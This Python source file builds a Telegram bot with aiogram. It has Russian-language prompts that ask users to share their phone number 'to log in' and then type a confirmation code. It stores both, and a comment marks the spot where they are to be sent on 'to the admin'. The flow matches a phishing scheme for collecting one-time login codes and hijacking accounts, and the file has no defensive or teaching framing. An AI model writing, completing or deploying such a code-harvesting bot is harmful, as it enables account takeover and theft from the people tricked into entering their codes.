import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# Установите ваш API_TOKEN в переменных окружения Railway
API_TOKEN = os.getenv('API_TOKEN')

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class AuthForm(StatesGroup):
    phone = State()
    code = State()

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("Отправить номер", request_contact=True))
    await message.answer("Для входа отправьте номер телефона:", reply_markup=kb)
    await AuthForm.phone.set()

@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthForm.phone)
async def get_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.contact.phone_number)
    await message.answer("Номер принят. Введите код подтверждения:", reply_markup=ReplyKeyboardRemove())
    await AuthForm.code.set()

@dp.message_handler(state=AuthForm.code)
async def get_code(message: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data['phone']
    code = message.text
    
    # Здесь логика отправки данных (например, админу)
    await message.answer(f"Данные получены.\nТелефон: {phone}\nКод: {code}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
